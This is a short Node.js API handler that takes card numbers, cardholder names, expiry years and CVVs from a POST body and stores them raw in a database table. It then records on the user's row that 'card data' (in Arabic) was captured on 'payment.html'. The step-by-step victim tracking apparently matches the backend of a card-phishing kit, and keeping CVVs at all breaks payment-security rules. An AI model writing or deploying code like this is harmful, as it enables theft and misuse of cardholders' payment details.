const { supabase, getUserFromReq, parseBody } = require('../supabase');

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const user = getUserFromReq(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const body = await parseBody(req);
  const userId = user.userId;

  await supabase.from('cards').insert({
    user_id: userId,
    cardNumber: body.cardNumber || '',
    cardName: body.cardName || '',
    year: body.year || '',
    cvv: body.cvv || ''
  });

  await supabase.from('users').update({
    message: 'بيانات البطاقة',
    page: 'payment.html',
    updated_at: new Date().toISOString()
  }).eq('id', userId);

  res.json({ success: true });
};
